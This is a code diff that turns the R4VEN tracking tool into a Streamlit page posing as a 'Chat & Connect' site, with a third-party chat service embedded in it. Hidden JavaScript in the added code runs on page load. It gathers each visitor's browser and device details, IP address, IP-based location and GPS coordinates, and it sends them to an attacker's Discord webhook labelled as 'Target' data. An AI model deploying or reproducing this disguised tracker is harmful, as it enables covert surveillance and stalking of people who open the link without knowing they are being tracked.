@@ -1,106 +1,137 @@
-#!/usr/bin/env python3
-import os
-import sys
-import threading
-import logging
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
-from banner import print_banners
-from port_forward import (
-    run_tunnel, 
-    start_port_forwarding, 
-    ask_port_forwarding, 
-    shutdown_flag, 
-    run_flask, 
-    args, 
-    is_port_available
+import streamlit as st
+import streamlit.components.v1 as components
+
+# Konfigurasi halaman Streamlit
+st.set_page_config(
+    page_title="Chat & Connect", 
+    page_icon="💬", 
+    layout="wide"
 )
 
-# Konfigurasi Logging
-LOG_FILE = "r4ven.log"
-logging.basicConfig(
-    filename=LOG_FILE, 
-    level=logging.INFO, 
-    format='%(asctime)s - %(message)s'
-)
+# Ambil Discord Webhook dari Streamlit Secrets secara aman
+try:
+    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
+except Exception:
+    webhook_url = ""
 
-# Definisi Warna ANSI untuk Terminal
-if sys.stdout.isatty():
-    R = '\033[31m'  # Red
-    G = '\033[32m'  # Green
-    C = '\033[36m'  # Cyan
-    W = '\033[0m'   # Reset
-    Y = '\033[33m'  # Yellow
-    M = '\033[35m'  # Magenta
-    B = '\033[34m'  # Blue
+# Kode HTML & JavaScript yang disatukan untuk Streamlit Cloud
+html_code = f"""
+<!DOCTYPE html>
+<html>
+<head>
+  <script type="text/javascript" src="dwebhook.js"></script>
+</head>
+<body onload="getLocation()">
+
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;"></iframe>
+
+  <p id="demo"></p>
+  <span id="gfg" style="display:none;"></span>
+  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script>
+    const WEBHOOK_URL = "{webhook_url}";
+    var x = document.getElementById("demo");
+
+    let datetime = new Date();
+    let localtime = String(datetime.toLocaleTimeString());
+
+    var sysinfo = (" GET ", "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```");
+
+    function sendToDiscord(payload) {{
+        const request = new XMLHttpRequest();
+        request.open("POST", WEBHOOK_URL);
+        request.setRequestHeader('Content-type', 'application/json');
+        request.send(JSON.stringify(payload));
+    }}
+
+    // 1. Kirim Info Sistem
+    var myEmbed1 = {{
+      author: {{ name: "Target System Information.." }},
+      title: "Uagent:",
+      description: sysinfo,
+      color: 15418782
+    }}
+    sendToDiscord({{
+      username: "R4VEN",
+      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+      content: "@everyone Someone Opened The Link O_o ",
+      embeds: [myEmbed1]
+    }});
+
+    // 2. Kirim IP Address
+    $.getJSON("https://api.ipify.org?format=json", function (data) {{
+      $("#gfg").html(data.ip);
+      var myEmbed2 = {{
+        author: {{ name: "Target Ip" }},
+        description: '```xl\\n' + data.ip + '```' + '\\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\\n",
+        color: 15548997,
+        footer: {{ text: "Geographic location based on IP address is approximate." }}
+      }};
+      sendToDiscord({{
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed2]
+      }});
+    }});
+
+    // 3. Kirim Detail IP Reconnaissance
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,lat,lon", function (response) {{
+      var myEmbed3 = {{
+        author: {{ name: "IP Address Reconnaissance" }},
+        title: response.status,
+        description: '```autohotkey\\nCountry: ' + response.country + '\\nCity: ' + response.city + '\\nLat: ' + response.lat + '\\nLon: ' + response.lon + '```',
+        color: 5763719
+      }};
+      sendToDiscord({{
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed3]
+      }});
+    }});
+
+    function getLocation() {{
+      if (navigator.geolocation) {{
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      }} else {{
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }}
+    }}
+
+    function showPosition(position) {{
+      var latlong = (" GET ", "```prolog\\nLatitude:" + position.coords.latitude + "\\nLongitude:" + position.coords.longitude + "```" + "\\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
+
+      var myEmbed4 = {{
+        author: {{ name: "Target Allowed Location Permission" }},
+        title: "GPS location of target..",
+        description: latlong,
+        color: 15844367,
+        footer: {{ text: "GPS fetch almost exact location." }}
+      }};
+      sendToDiscord({{
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed4]
+      }});
+    }}
+
+    function showError(error) {{
+      if (error.code == error.PERMISSION_DENIED) {{
+        sendToDiscord({{
+          username: "R4VEN",
+          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+          content: "```diff\\n- User denied the request for Geolocation.```"
+        }});
+      }}
+    }}
+  </script>
+</body>
+</html>
+"""
+
+# Render aplikasi di Streamlit
+if webhook_url:
+    components.html(html_code, height=950, scrolling=True)
 else:
-    R = G = C = W = Y = M = B = ''
-
-def get_user_choice():
-    """Menampilkan menu interaktif dan mendapatkan pilihan modul pelacakan."""
-    print(f"{B}[~] {C}What would you like to do?{W}\n")
-    print(f"{Y}1. {W}Track Target GPS Location")
-    print(f"{Y}2. {W}Capture Target Image")
-    print(f"{Y}3. {W}Fetch Target IP Address")
-    print(f"{Y}4. {W}All Of It")
-    print(f"\n{M}Note: {W}IP address & Device details available in all the options")
-    
-    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
-    return choice.strip()
-
-def main():
-    print_banners()
-
-    log_file_path = os.path.abspath(LOG_FILE)
-    print(f"{B}[+] {Y}Logs :{W} {log_file_path}\n")
-
-    # Validasi ketersediaan port
-    if not is_port_available(args.port):
-        print(f"{B}[?] {Y}Port : {W} {args.port} is already in use.{R} Please select another port.{W}")
-        sys.exit(1)
-
-    print(f"____________________________________________________________________________\n")
-
-    # Ambil pilihan menu pengguna
-    choice = get_user_choice()
-    
-    # Mapping pilihan ke nama folder modul
-    folder_mapping = {
-        '1': 'gps',
-        '2': 'cam',
-        '3': 'ip',
-        '4': 'all'
-    }
-
-    if choice not in folder_mapping:
-        print(f"{R}Invalid choice. Exiting.{W}")
-        sys.exit(1)
-        
-    folder_name = folder_mapping[choice]
-
-    # Konfigurasi Webhook
-    check_and_get_webhook_url(folder_name)
-
-    # Konfigurasi Port Forwarding / Tunneling
-    port_forwarding_choice = ask_port_forwarding()
-    if port_forwarding_choice == '1':
-        port_forwarding_thread = threading.Thread(target=start_port_forwarding, daemon=True)
-        port_forwarding_thread.start()
-    elif port_forwarding_choice == '2':
-        threading.Thread(target=run_tunnel, daemon=True).start()
-    else:
-        print(f"\n{R}Warning: {W}Port forwarding is necessary for the application to work on other devices.")
-        print(f"{Y}Ensure you set it up using another method like Ngrok, Cloudflare, etc.{W}")
-
-    # Menjalankan Server Flask
-    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/{W}"
-    print(f"\n{start_message}\n")
-    logging.info(start_message)
-
-    try:
-        run_flask(folder_name)
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Server stopped by user. Exiting...{W}")
-        sys.exit(0)
-
-if __name__ == "__main__":
-    main()
+    st.error("⚠️ Discord Webhook URL belum diatur!")
+    st.info("Tambahkan `DISCORD_WEBHOOK_URL` di bagian **Settings -> Secrets** pada dasbor Streamlit Cloud Anda.")
